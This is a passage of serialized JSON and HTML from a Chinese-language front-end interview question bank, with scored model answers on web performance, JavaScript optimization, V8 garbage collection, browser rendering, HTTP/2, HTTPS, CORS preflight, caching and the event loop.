合并多个CSS和JavaScript文件","task":false,"loose":false,"text":"合并多个CSS和JavaScript文件","tokens":[{"type":"text","raw":"合并多个CSS和JavaScript文件","text":"合并多个CSS和JavaScript文件","tokens":[{"type":"text","raw":"合并多个CSS和JavaScript文件","text":"合并多个CSS和JavaScript文件","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 使用CDN：\\n  + 将静态资源托管到CDN上\\n  + 减少资源加载的延迟\\n\\n","task":false,"loose":true,"text":"**1：** 使用CDN：\\n+ 将静态资源托管到CDN上\\n+ 减少资源加载的延迟\\n","tokens":[{"type":"text","raw":"**1：** 使用CDN：\\n","text":"**1：** 使用CDN：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用CDN：","text":" 使用CDN：","escaped":false}]},{"type":"list","raw":"+ 将静态资源托管到CDN上\\n+ 减少资源加载的延迟\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 将静态资源托管到CDN上\\n","task":false,"loose":false,"text":"将静态资源托管到CDN上","tokens":[{"type":"text","raw":"将静态资源托管到CDN上","text":"将静态资源托管到CDN上","tokens":[{"type":"text","raw":"将静态资源托管到CDN上","text":"将静态资源托管到CDN上","escaped":false}]}]},{"type":"list_item","raw":"+ 减少资源加载的延迟","task":false,"loose":false,"text":"减少资源加载的延迟","tokens":[{"type":"text","raw":"减少资源加载的延迟","text":"减少资源加载的延迟","tokens":[{"type":"text","raw":"减少资源加载的延迟","text":"减少资源加载的延迟","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 图片优化：\\n  + 使用合适的图片格式（如WebP）\\n  + 使用图片懒加载\\n  + 使用CSS Sprites合并小图标\\n\\n","task":false,"loose":true,"text":"**1：** 图片优化：\\n+ 使用合适的图片格式（如WebP）\\n+ 使用图片懒加载\\n+ 使用CSS Sprites合并小图标\\n","tokens":[{"type":"text","raw":"**1：** 图片优化：\\n","text":"**1：** 图片优化：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 图片优化：","text":" 图片优化：","escaped":false}]},{"type":"list","raw":"+ 使用合适的图片格式（如WebP）\\n+ 使用图片懒加载\\n+ 使用CSS Sprites合并小图标\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用合适的图片格式（如WebP）\\n","task":false,"loose":false,"text":"使用合适的图片格式（如WebP）","tokens":[{"type":"text","raw":"使用合适的图片格式（如WebP）","text":"使用合适的图片格式（如WebP）","tokens":[{"type":"text","raw":"使用合适的图片格式（如WebP）","text":"使用合适的图片格式（如WebP）","escaped":false}]}]},{"type":"list_item","raw":"+ 使用图片懒加载\\n","task":false,"loose":false,"text":"使用图片懒加载","tokens":[{"type":"text","raw":"使用图片懒加载","text":"使用图片懒加载","tokens":[{"type":"text","raw":"使用图片懒加载","text":"使用图片懒加载","escaped":false}]}]},{"type":"list_item","raw":"+ 使用CSS Sprites合并小图标","task":false,"loose":false,"text":"使用CSS Sprites合并小图标","tokens":[{"type":"text","raw":"使用CSS Sprites合并小图标","text":"使用CSS Sprites合并小图标","tokens":[{"type":"text","raw":"使用CSS Sprites合并小图标","text":"使用CSS Sprites合并小图标","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 服务器端渲染（SSR）：\\n  + 使用SSR生成首屏HTML\\n  + 减少客户端渲染的时间\\n\\n","task":false,"loose":true,"text":"**1：** 服务器端渲染（SSR）：\\n+ 使用SSR生成首屏HTML\\n+ 减少客户端渲染的时间\\n","tokens":[{"type":"text","raw":"**1：** 服务器端渲染（SSR）：\\n","text":"**1：** 服务器端渲染（SSR）：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 服务器端渲染（SSR）：","text":" 服务器端渲染（SSR）：","escaped":false}]},{"type":"list","raw":"+ 使用SSR生成首屏HTML\\n+ 减少客户端渲染的时间\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用SSR生成首屏HTML\\n","task":false,"loose":false,"text":"使用SSR生成首屏HTML","tokens":[{"type":"text","raw":"使用SSR生成首屏HTML","text":"使用SSR生成首屏HTML","tokens":[{"type":"text","raw":"使用SSR生成首屏HTML","text":"使用SSR生成首屏HTML","escaped":false}]}]},{"type":"list_item","raw":"+ 减少客户端渲染的时间","task":false,"loose":false,"text":"减少客户端渲染的时间","tokens":[{"type":"text","raw":"减少客户端渲染的时间","text":"减少客户端渲染的时间","tokens":[{"type":"text","raw":"减少客户端渲染的时间","text":"减少客户端渲染的时间","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 减少HTTP请求：\\n  + 使用HTTP/2多路复用\\n  + 合并请求，减少请求数量","task":false,"loose":true,"text":"**1：** 减少HTTP请求：\\n+ 使用HTTP/2多路复用\\n+ 合并请求，减少请求数量","tokens":[{"type":"text","raw":"**1：** 减少HTTP请求：\\n","text":"**1：** 减少HTTP请求：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 减少HTTP请求：","text":" 减少HTTP请求：","escaped":false}]},{"type":"list","raw":"+ 使用HTTP/2多路复用\\n+ 合并请求，减少请求数量","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用HTTP/2多路复用\\n","task":false,"loose":false,"text":"使用HTTP/2多路复用","tokens":[{"type":"text","raw":"使用HTTP/2多路复用","text":"使用HTTP/2多路复用","tokens":[{"type":"text","raw":"使用HTTP/2多路复用","text":"使用HTTP/2多路复用","escaped":false}]}]},{"type":"list_item","raw":"+ 合并请求，减少请求数量","task":false,"loose":false,"text":"合并请求，减少请求数量","tokens":[{"type":"text","raw":"合并请求，减少请求数量","text":"合并请求，减少请求数量","tokens":[{"type":"text","raw":"合并请求，减少请求数量","text":"合并请求，减少请求数量","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 如何进行JavaScript性能优化？\\n\\n","depth":2,"text":"如何进行JavaScript性能优化？","tokens":[{"type":"text","raw":"如何进行JavaScript性能优化？","text":"如何进行JavaScript性能优化？","escaped":false}]},{"type":"heading","raw":"#### 类型：`高级`\\n\\n","depth":4,"text":"类型：`高级`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`高级`","text":"高级"}]},{"type":"heading","raw":"#### 级别：`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"list","raw":"- **1：** 减少作用域链查找：\\n  + 使用局部变量缓存全局变量\\n  + 避免在循环中访问全局变量\\n\\n- **1：** 避免不必要的计算：\\n  + 使用缓存存储计算结果\\n  + 使用位运算替代数学运算\\n\\n- **1：** 优化循环：\\n  + 使用for循环代替forEach、map等\\n  + 在循环中缓存数组长度\\n\\n- **1：** 使用异步编程：\\n  + 使用Promise、async/await优化异步操作\\n  + 使用Web Workers进行多线程计算\\n\\n- **1：** 减少内存泄漏：\\n  + 使用WeakMap、WeakSet管理对象引用\\n  + 清理不再使用的事件监听器\\n\\n- **1：** 使用现代JavaScript特性：\\n  + 使用ES6+特性优化代码结构\\n  + 使用模块化提高代码可维护性\\n","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** 减少作用域链查找：\\n  + 使用局部变量缓存全局变量\\n  + 避免在循环中访问全局变量\\n\\n","task":false,"loose":true,"text":"**1：** 减少作用域链查找：\\n+ 使用局部变量缓存全局变量\\n+ 避免在循环中访问全局变量\\n","tokens":[{"type":"text","raw":"**1：** 减少作用域链查找：\\n","text":"**1：** 减少作用域链查找：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 减少作用域链查找：","text":" 减少作用域链查找：","escaped":false}]},{"type":"list","raw":"+ 使用局部变量缓存全局变量\\n+ 避免在循环中访问全局变量\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用局部变量缓存全局变量\\n","task":false,"loose":false,"text":"使用局部变量缓存全局变量","tokens":[{"type":"text","raw":"使用局部变量缓存全局变量","text":"使用局部变量缓存全局变量","tokens":[{"type":"text","raw":"使用局部变量缓存全局变量","text":"使用局部变量缓存全局变量","escaped":false}]}]},{"type":"list_item","raw":"+ 避免在循环中访问全局变量","task":false,"loose":false,"text":"避免在循环中访问全局变量","tokens":[{"type":"text","raw":"避免在循环中访问全局变量","text":"避免在循环中访问全局变量","tokens":[{"type":"text","raw":"避免在循环中访问全局变量","text":"避免在循环中访问全局变量","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 避免不必要的计算：\\n  + 使用缓存存储计算结果\\n  + 使用位运算替代数学运算\\n\\n","task":false,"loose":true,"text":"**1：** 避免不必要的计算：\\n+ 使用缓存存储计算结果\\n+ 使用位运算替代数学运算\\n","tokens":[{"type":"text","raw":"**1：** 避免不必要的计算：\\n","text":"**1：** 避免不必要的计算：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 避免不必要的计算：","text":" 避免不必要的计算：","escaped":false}]},{"type":"list","raw":"+ 使用缓存存储计算结果\\n+ 使用位运算替代数学运算\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用缓存存储计算结果\\n","task":false,"loose":false,"text":"使用缓存存储计算结果","tokens":[{"type":"text","raw":"使用缓存存储计算结果","text":"使用缓存存储计算结果","tokens":[{"type":"text","raw":"使用缓存存储计算结果","text":"使用缓存存储计算结果","escaped":false}]}]},{"type":"list_item","raw":"+ 使用位运算替代数学运算","task":false,"loose":false,"text":"使用位运算替代数学运算","tokens":[{"type":"text","raw":"使用位运算替代数学运算","text":"使用位运算替代数学运算","tokens":[{"type":"text","raw":"使用位运算替代数学运算","text":"使用位运算替代数学运算","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 优化循环：\\n  + 使用for循环代替forEach、map等\\n  + 在循环中缓存数组长度\\n\\n","task":false,"loose":true,"text":"**1：** 优化循环：\\n+ 使用for循环代替forEach、map等\\n+ 在循环中缓存数组长度\\n","tokens":[{"type":"text","raw":"**1：** 优化循环：\\n","text":"**1：** 优化循环：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 优化循环：","text":" 优化循环：","escaped":false}]},{"type":"list","raw":"+ 使用for循环代替forEach、map等\\n+ 在循环中缓存数组长度\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用for循环代替forEach、map等\\n","task":false,"loose":false,"text":"使用for循环代替forEach、map等","tokens":[{"type":"text","raw":"使用for循环代替forEach、map等","text":"使用for循环代替forEach、map等","tokens":[{"type":"text","raw":"使用for循环代替forEach、map等","text":"使用for循环代替forEach、map等","escaped":false}]}]},{"type":"list_item","raw":"+ 在循环中缓存数组长度","task":false,"loose":false,"text":"在循环中缓存数组长度","tokens":[{"type":"text","raw":"在循环中缓存数组长度","text":"在循环中缓存数组长度","tokens":[{"type":"text","raw":"在循环中缓存数组长度","text":"在循环中缓存数组长度","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 使用异步编程：\\n  + 使用Promise、async/await优化异步操作\\n  + 使用Web Workers进行多线程计算\\n\\n","task":false,"loose":true,"text":"**1：** 使用异步编程：\\n+ 使用Promise、async/await优化异步操作\\n+ 使用Web Workers进行多线程计算\\n","tokens":[{"type":"text","raw":"**1：** 使用异步编程：\\n","text":"**1：** 使用异步编程：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用异步编程：","text":" 使用异步编程：","escaped":false}]},{"type":"list","raw":"+ 使用Promise、async/await优化异步操作\\n+ 使用Web Workers进行多线程计算\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用Promise、async/await优化异步操作\\n","task":false,"loose":false,"text":"使用Promise、async/await优化异步操作","tokens":[{"type":"text","raw":"使用Promise、async/await优化异步操作","text":"使用Promise、async/await优化异步操作","tokens":[{"type":"text","raw":"使用Promise、async/await优化异步操作","text":"使用Promise、async/await优化异步操作","escaped":false}]}]},{"type":"list_item","raw":"+ 使用Web Workers进行多线程计算","task":false,"loose":false,"text":"使用Web Workers进行多线程计算","tokens":[{"type":"text","raw":"使用Web Workers进行多线程计算","text":"使用Web Workers进行多线程计算","tokens":[{"type":"text","raw":"使用Web Workers进行多线程计算","text":"使用Web Workers进行多线程计算","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 减少内存泄漏：\\n  + 使用WeakMap、WeakSet管理对象引用\\n  + 清理不再使用的事件监听器\\n\\n","task":false,"loose":true,"text":"**1：** 减少内存泄漏：\\n+ 使用WeakMap、WeakSet管理对象引用\\n+ 清理不再使用的事件监听器\\n","tokens":[{"type":"text","raw":"**1：** 减少内存泄漏：\\n","text":"**1：** 减少内存泄漏：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 减少内存泄漏：","text":" 减少内存泄漏：","escaped":false}]},{"type":"list","raw":"+ 使用WeakMap、WeakSet管理对象引用\\n+ 清理不再使用的事件监听器\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用WeakMap、WeakSet管理对象引用\\n","task":false,"loose":false,"text":"使用WeakMap、WeakSet管理对象引用","tokens":[{"type":"text","raw":"使用WeakMap、WeakSet管理对象引用","text":"使用WeakMap、WeakSet管理对象引用","tokens":[{"type":"text","raw":"使用WeakMap、WeakSet管理对象引用","text":"使用WeakMap、WeakSet管理对象引用","escaped":false}]}]},{"type":"list_item","raw":"+ 清理不再使用的事件监听器","task":false,"loose":false,"text":"清理不再使用的事件监听器","tokens":[{"type":"text","raw":"清理不再使用的事件监听器","text":"清理不再使用的事件监听器","tokens":[{"type":"text","raw":"清理不再使用的事件监听器","text":"清理不再使用的事件监听器","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 使用现代JavaScript特性：\\n  + 使用ES6+特性优化代码结构\\n  + 使用模块化提高代码可维护性","task":false,"loose":true,"text":"**1：** 使用现代JavaScript特性：\\n+ 使用ES6+特性优化代码结构\\n+ 使用模块化提高代码可维护性","tokens":[{"type":"text","raw":"**1：** 使用现代JavaScript特性：\\n","text":"**1：** 使用现代JavaScript特性：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用现代JavaScript特性：","text":" 使用现代JavaScript特性：","escaped":false}]},{"type":"list","raw":"+ 使用ES6+特性优化代码结构\\n+ 使用模块化提高代码可维护性","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用ES6+特性优化代码结构\\n","task":false,"loose":false,"text":"使用ES6+特性优化代码结构","tokens":[{"type":"text","raw":"使用ES6+特性优化代码结构","text":"使用ES6+特性优化代码结构","tokens":[{"type":"text","raw":"使用ES6+特性优化代码结构","text":"使用ES6+特性优化代码结构","escaped":false}]}]},{"type":"list_item","raw":"+ 使用模块化提高代码可维护性","task":false,"loose":false,"text":"使用模块化提高代码可维护性","tokens":[{"type":"text","raw":"使用模块化提高代码可维护性","text":"使用模块化提高代码可维护性","tokens":[{"type":"text","raw":"使用模块化提高代码可维护性","text":"使用模块化提高代码可维护性","escaped":false}]}]}]}]}]}]},{"key":"浏览器原理篇","content":"<h1>浏览器原理篇</h1>\\n<h2>浏览器垃圾回收机制 - V8的垃圾回收机制是怎样的</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>1：</strong> V8 实现了准确式 GC，GC 算法采用了分代式垃圾回收机制。因此，V8 将内存（堆）分为新生代和老生代两部分。</li>\\n<li><strong>1：</strong>（1）新生代算法 新生代中的对象一般存活时间较短，使用 Scavenge GC 算法。</li>\\n<li><strong>1：</strong>（2）老生代算法 老生代中的对象一般存活时间较长且数量也多，使用了两个算法，分别是标记清除算法和标记压缩算法。</li>\\n</ul>\\n<h2>哪些操作会造成内存泄漏？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 第一种情况是由于使用未声明的变量，而意外的创建了一个全局变量，而使这个变量一直留在内存中无法被回收。</li>\\n<li><strong>1：</strong> 第二种情况是设置了 setInterval 定时器，而忘记取消它，如果循环函数有对外部变量的引用的话，那么这个变量会被一直留在内存中，而无法被回收。</li>\\n<li><strong>1：</strong> 第三种情况是获取一个 DOM 元素的引用，而后面这个元素被删除，由于我们一直保留了对这个元素的引用，所以它也无法被回收。</li>\\n<li><strong>1：</strong> 第四种情况是不合理的使用闭包，从而导致某些变量一直被留在内存当中。</li>\\n</ul>\\n<h2>浏览器的渲染过程</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 首先解析收到的文档，根据文档定义构建一棵 DOM 树，DOM 树是由 DOM 元素及属性节点组成的。</li>\\n<li><strong>1：</strong> 然后对 CSS 进行解析，生成 CSSOM 规则树。</li>\\n<li><strong>1：</strong> 根据 DOM 树和 CSSOM 规则树构建渲染树。渲染树的节点被称为渲染对象，渲染对象是一个包含有颜色和大小等属性的矩形，渲染对象和 DOM 元素相对应，但这种对应关系不是一对一的，不可见的 DOM 元素不会被插入渲染树。还有一些 DOM元素对应几个可见对象，它们一般是一些具有复杂结构的元素，无法用一个矩形来描述。</li>\\n<li><strong>1：</strong> 当渲染对象被创建并添加到树中，它们并没有位置和大小，所以当浏览器生成渲染树以后，就会根据渲染树来进行布局（也可以叫做回流）。这一阶段浏览器要做的事情是要弄清楚各个节点在页面中的确切位置和大小。通常这一行为也被称为“自动重排”。</li>\\n<li><strong>1：</strong> 布局阶段结束后是绘制阶段，遍历渲染树并调用渲染对象的 paint 方法将它们的内容显示在屏幕上，绘制使用 UI 基础组件。</li>\\n</ul>\\n<h2>GET和POST有什么区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li>GET请求的请求参数会附加在URL之后，参数之间使用&quot;&amp;&quot;连接，多个参数将会造成URL长度增加。而POST请求的请求参数则包含在请求体中，不会在URL中显示。</li>\\n<li>由于GET请求的参数附加在URL之后，因此其请求长度受限于浏览器对URL长度的限制（通常浏览器对URL的长度有限制，而服务器对URL的长度限制更为宽松）。而POST请求则没有这个问题，请求参数包含在请求体中，因此可以传输大量数据。</li>\\n<li>GET请求的参数会暴露在URL中，因此不能用于传输敏感信息，如密码等。而POST请求的参数在请求体中，不会在URL中显示，相对更加安全。然而，这并不意味着POST请求就一定比GET请求更安全，因为安全性还需要依赖于其他因素，如SSL/TLS加密等。</li>\\n<li>GET请求是幂等的，即多次执行同一GET请求，服务器将返回相同的结果。而POST请求则不是幂等的，因为每次提交都会创建新的资源。</li>\\n<li>GET请求可以被缓存，而POST请求则不会，除非在响应头中包含适当的Cache-Control或Expires字段。</li>\\n<li>GET请求可以被浏览器缓存，因此可以通过点击后退按钮或刷新按钮来重复执行。而POST请求则不会，因为这些操作对POST请求没有实际意义。</li>\\n</ul>\\n<h2>HTTP2相对于HTTP1.x有什么优势和特点？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li>HTTP/2不再使用文本格式来传输数据，而是将所有传输的信息分割为更小的消息和帧（frame），并以二进制格式进行编码。这有助于更高效地解析HTTP消息，并减少了解析错误的可能性。</li>\\n<li>HTTP/2引入了多路复用技术，允许在单个TCP连接中并行处理多个请求和响应。这消除了HTTP/1.x中的队头阻塞问题，极大地提高了网络性能和资源利用率。</li>\\n<li>HTTP/2使用了头部压缩技术，通过共享头部信息，可以显著减少传输的数据量。这有助于减少延迟和网络带宽的消耗，特别是在传输大量小请求时效果更为显著。</li>\\n<li>HTTP/2允许服务器主动向客户端推送资源，而无需等待客户端的请求。这有助于减少往返时间，并提高网页加载速度。</li>\\n<li>HTTP/2通过流控制、消息控制和窗口控制等机制，实现了对流量的精细控制，有助于防止网络拥塞和资源浪费。</li>\\n</ul>\\n<h2>https是怎么保证安全的，为什么比http安全？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li>HTTPS使用SSL/TLS协议对HTTP报文进行加密，使得敏感数据在网络传输过程中不容易被窃听和篡改。这种加密过程结合了对称加密和非对称加密，确保数据的保密性和完整性。</li>\\n<li>HTTPS通过数字证书进行身份验证，确保通信双方的真实性。在建立HTTPS连接时，服务器会提供数字证书来证明自己的身份。如果验证通过，客户端就可以信任服务器，并继续与其进行安全的数据传输。这有效防止了被恶意伪装的服务器攻击。</li>\\n<li>在传输数据之前，HTTPS会对数据进行加密，并使用消息摘要（hash）算法生成一个摘要值。在数据到达接收端后，接收端会使用相同的算法对接收到的数据进行摘要计算，并与发送端的摘要值进行比较。如果两者一致，说明数据在传输过程中没有被篡改。如果不一致，通信双方应重新进行验证或中断连接。</li>\\n</ul>\\n<h2>post请求为什么会多发送一次option请求？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li>POST 请求前发送的 OPTIONS 请求实际上是 HTTP 的一种特性，称为“预检请求”（Preflight request）。这主要发生在跨域请求（CORS, Cross-Origin Resource Sharing）的场景中，尤其是当请求涉及一些可能不太安全的方法（如 PUT、DELETE 或 POST）或使用了一些自定义的 HTTP 头部时。<br>预检请求的目的是检查服务器是否允许来自不同源（域、协议或端口）的请求进行某些操作。这样做可以确保客户端在发送实际请求之前，先得到服务器的明确许可。</li>\\n</ul>\\n<h2>从输入URL到看到页面发生的全过程？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li>1.用户首先在浏览器地址栏中输入想要访问的网站的URL。</li>\\n<li>2.浏览器内部代码会解析这个URL。它首先会检查本地hosts文件，看是否有对应的域名。如果有，浏览器就会直接向该IP地址发送请求。如果没有，浏览器会将域名发送给DNS服务器进行解析，将域名转换成对应的服务器IP地址。</li>\\n<li>3.浏览器通过HTTP协议向服务器发送请求。HTTP协议是一种应用层协议，用于在客户端和服务器之间传输数据。浏览器会根据URL中的路径和参数构建HTTP请求，并发送给服务器。</li>\\n<li>4.服务器接收到请求后，会根据请求的内容进行处理，并返回相应的HTTP响应。响应中包含了服务器返回的数据，如HTML、CSS、JavaScript等资源文件，以及状态码等信息。</li>\\n<li>5.浏览器接收到服务器返回的响应后，会解析响应中的数据，并开始渲染页面。浏览器会根据HTML文件中的标签和属性，将页面元素渲染出来。同时，浏览器还会下载并解析CSS和JavaScript文件，以实现页面的样式和交互功能。</li>\\n<li>6.当页面加载完成后，浏览器会触发DOMContentLoaded事件，通知页面已经加载完成。此时，页面中的JavaScript代码可以开始执行，实现页面的交互功能。</li>\\n<li>7.如果页面中还有异步请求（如Ajax请求），浏览器会继续发送这些请求，并等待服务器返回响应。当这些请求完成后，浏览器会更新页面中的相应部分，以反映最新的数据。</li>\\n</ul>\\n<h2>对Service Worker的理解</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><strong>1：</strong> Service Worker 是运行在浏览器背后的独立线程，一般可以用来实现缓存功能。</li>\\n<li><strong>4：</strong><ul>\\n<li>首先需要先注册 Service Worker，然后监听到 install 事件以后就可以缓存需要的文件</li>\\n<li>那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存</li>\\n<li>存在缓存的话就可以直接读取缓存文件，否则就去请求数据。</li>\\n<li>打开页面，可以在开发者工具中的 Application 看到 Service Worker 已经启动了,在Cache中也可以发现所需的文件已被缓存</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>协商缓存和强缓存的区别</h2>\\n<h4>类型：<code>业务</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>2：</strong> 强缓存<ul>\\n<li>使用强缓存策略时，如果缓存资源有效，则直接使用缓存资源，不必再向服务器发起请求。</li>\\n<li>设置方式：分别是 http 响应头信息中的 Expires 属性和 Cache-Control 属性。</li>\\n</ul>\\n</li>\\n<li><strong>2：</strong> 协商缓存<ul>\\n<li>如果命中强制缓存，就无需发起新的请求，直接使用缓存资源，如果没有命中强制缓存，且设置了协商缓存，这个时候协商缓存就会发挥作用了。</li>\\n<li>设置方式：分别是 http请求头中if-modified-since和if-none-match 响应 头信息中的 Etag 和 Last-Modified 属性。</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>什么情况会阻塞渲染</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> 首先渲染的前提是生成渲染树，所以 HTML 和 CSS 肯定会阻塞渲染。</p>\\n</li>\\n<li><p><strong>4：</strong></p>\\n<ul>\\n<li>当浏览器在解析到 script 标签时，会暂停构建 DOM，完成后才会从暂停的地方重新开始。</li>\\n<li>如果你想首屏渲染的越快，就越不应该在首屏就加载 JS 文件，这也是都建议将 script 标签放在 body 标签底部的原因。</li>\\n<li>script 标签加上 defer 属性以后，表示该 JS 文件会并行下载，但是会放到 HTML 解析完成后顺序执行，所以对于这种情况你可以把 script 标签放在任意位置。</li>\\n<li>对于没有任何依赖的 JS 文件可以加上 async 属性，表示 JS 文件下载和解析不会阻塞渲染。</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>浏览器的事件机制</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li>浏览器的事件机制主要涉及到事件的触发、传播和处理。当用户在浏览器中进行某些操作，如点击按钮、移动鼠标或输入文本时，会触发相应的事件。这些事件被封装为event对象，包含了事件的属性和方法，供开发者在事件处理函数中使用。</li>\\n</ul>\\n<p>事件的传播过程分为三个阶段：捕获阶段、目标阶段和冒泡阶段。在DOM2级事件模型中，事件首先在最外层HTML元素上开始捕获，然后向下传递到事件的目标元素，沿途触发所有设置了捕获事件处理器的元素。接着，事件处理器在事件的目标元素上执行，这是事件处理的核心阶段。最后，事件从目标元素向上回溯，触发所有设置了冒泡事件处理器的元素，完成冒泡阶段。这种机制允许开发者在事件传播的不同阶段拦截并处理事件。</p>\\n<p>常见的事件类型包括鼠标事件（如click、mouseover、mousedown等）、键盘事件（如keydown、keyup、keypress等）以及表单事件（如submit、input、change等）。这些事件为开发者提供了丰富的交互能力，可以响应用户的各种操作并相应地更新页面内容。</p>\\n<p>在事件处理过程中，浏览器还维护一个事件队列。一旦事件队列中的事件得到处理，它就会被移除。此外，浏览器还支持宏任务和微任务的概念，用于管理异步执行的任务。例如，setTimeout、setInterval等是常见的宏任务，而Promise的回调则是微任务。这些任务的执行顺序和优先级也是事件机制的一部分。</p>\\n<h2>浏览器的事件循环和node的事件循环区别</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 